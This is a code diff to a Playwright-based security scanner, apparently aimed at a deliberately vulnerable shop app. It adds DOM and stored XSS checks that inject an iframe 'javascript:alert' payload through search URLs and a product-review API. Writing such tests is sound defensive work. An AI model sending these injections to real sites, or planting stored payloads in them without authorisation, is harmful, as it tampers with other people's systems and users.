@@ -31,6 +31,9 @@ const workflow = {
   csrfOrigin: "http://htmledit.squarefree.com",
   authenticationError: null,
   reflectedXss: false,
+  domXss: false,
+  persistentXss: false,
+  xssPayload: '<iframe src="javascript:alert(`xss`)">',
 };
 let cartRequest;
 let loginToken = null;
@@ -522,19 +525,103 @@ async function runCsrfWorkflow() {
 }
 
 async function runReflectedXssWorkflow() {
-  const marker = "tfm-xss-reflected";
-  const payload = `<img src=x onerror=alert('${marker}')>`;
+  const payload = '<iframe src="javascript:alert(`xss`)">';
+  const xssUrl = new URL("/rest/products/search", targetUrl.origin);
+  xssUrl.searchParams.set("q", payload);
+
   let dialogDetected = false;
   page.once("dialog", async dialog => {
-    dialogDetected = dialog.message() === marker;
+    dialogDetected = true;
     await dialog.dismiss();
   });
-  const xssUrl = new URL(targetUrl.href);
-  xssUrl.hash = `/search?q=${encodeURIComponent(payload)}`;
+
   await page.goto(xssUrl.href, { waitUntil: "networkidle", timeout: 30000 });
   await page.waitForTimeout(1000);
-  workflow.reflectedXss = dialogDetected;
+  const reflectedPayloadPresent = await page.locator("iframe").count() > 0 ||
+    (await page.content()).includes(payload);
+  workflow.reflectedXss = dialogDetected || reflectedPayloadPresent;
   console.log(`WORKFLOW reflected_xss=${workflow.reflectedXss}`);
+}
+
+async function runDomXssWorkflow() {
+  const payload = '<iframe src="javascript:alert(`xss`)">';
+  const xssUrl = new URL(targetUrl.href);
+  xssUrl.hash = `/search?q=${encodeURIComponent(payload)}`;
+
+  let dialogDetected = false;
+  page.once("dialog", async dialog => {
+    dialogDetected = true;
+    await dialog.dismiss();
+  });
+
+  await page.goto(xssUrl.href, { waitUntil: "networkidle", timeout: 30000 });
+  await page.waitForTimeout(1500);
+  const domPayloadPresent = await page.locator("iframe").count() > 0 ||
+    (await page.content()).includes("javascript:alert");
+  workflow.domXss = dialogDetected || domPayloadPresent;
+  console.log(`WORKFLOW dom_xss=${workflow.domXss}`);
+}
+
+async function runPersistentXssWorkflow() {
+  if (!loginToken) {
+    workflow.persistentXss = false;
+    console.log("WORKFLOW persistent_xss=false reason=missing_login_token");
+    return;
+  }
+
+  const payload = '<iframe src="javascript:alert(`xss`)">';
+  const productId = 1;
+  const response = await context.request.put(
+    new URL(`/rest/products/${productId}/reviews`, targetUrl.origin).href,
+    {
+      headers: {
+        "Authorization": `Bearer ${loginToken}`,
+        "Content-Type": "application/json",
+      },
+      data: {
+        message: payload,
+        author: testUsername,
+      },
+      timeout: 30000,
+    }
+  ).catch(error => {
+    console.log(`WORKFLOW persistent_xss_request_error=${error.message}`);
+    return null;
+  });
+
+  if (!response) {
+    return;
+  }
+
+  const reviewsResponse = await context.request.get(
+    new URL(`/rest/products/${productId}/reviews`, targetUrl.origin).href,
+    {
+      headers: loginToken ? { "Authorization": `Bearer ${loginToken}` } : {},
+      timeout: 30000,
+    }
+  ).catch(() => null);
+  let payloadStored = false;
+  if (reviewsResponse?.ok()) {
+    const reviews = await reviewsResponse.json().catch(() => null);
+    payloadStored = JSON.stringify(reviews).includes(payload);
+  }
+
+  await page.goto(
+    new URL(`/#/search?q=${encodeURIComponent("Apple")}`, targetUrl.origin).href,
+    { waitUntil: "networkidle", timeout: 30000 }
+  );
+  await page.waitForTimeout(1500);
+  const content = await page.content();
+  workflow.persistentXss =
+    response.status() >= 200 &&
+    response.status() < 300 &&
+    (payloadStored ||
+      content.includes(payload) ||
+      await page.locator("iframe").count() > 0);
+  console.log(
+    `WORKFLOW persistent_xss=${workflow.persistentXss} ` +
+    `status=${response.status()}`
+  );
 }
 
 while (pending.length > 0 && visited.size < maxPages) {
@@ -579,6 +666,12 @@ await runCsrfWorkflow().catch(error =>
 );
 await runReflectedXssWorkflow().catch(error =>
   console.log(`WORKFLOW reflected_xss_error=${error.message}`)
+);
+await runDomXssWorkflow().catch(error =>
+  console.log(`WORKFLOW dom_xss_error=${error.message}`)
+);
+await runPersistentXssWorkflow().catch(error =>
+  console.log(`WORKFLOW persistent_xss_error=${error.message}`)
 );
 
 console.log(`BROWSER_SUMMARY visited=${visited.size} pending=${pending.length}`);
